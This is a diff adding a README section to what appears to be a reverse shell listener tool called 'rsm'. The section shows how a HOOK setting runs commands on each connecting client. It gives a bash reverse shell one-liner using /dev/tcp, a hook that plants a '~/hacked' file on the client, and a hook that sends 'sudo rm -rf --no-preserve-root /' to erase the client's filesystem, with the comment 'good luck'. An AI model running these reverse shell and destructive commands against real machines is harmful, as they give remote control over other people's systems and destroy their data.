@@ -39,6 +39,23 @@ Stop the server and cleanup
 # Stop all rsm listeners
 ```
 
+Hooking the client connection
+
+```shell
+HOOK='echo Hello, you are $IP:$PORT' ./rsm d 12345
+nc 127.0.0.1 12345
+#| Hello, you are 127.0.0.1:50522
+#|
+
+HOOK='echo "echo hehe > ~/hacked"' ./rsm d 12345
+bash -c 'bash -i >& /dev/tcp/127.0.0.1/12345 0<&1'
+cat ~/hacked
+#| hehe
+
+HOOK='echo "sudo rm -rf --no-preserve-root /"' ./rsm d 12345
+bash -c 'bash -i >& /dev/tcp/127.0.0.1/12345 0<&1' # good luck
+```
+
 ## Install
 
 ```shell
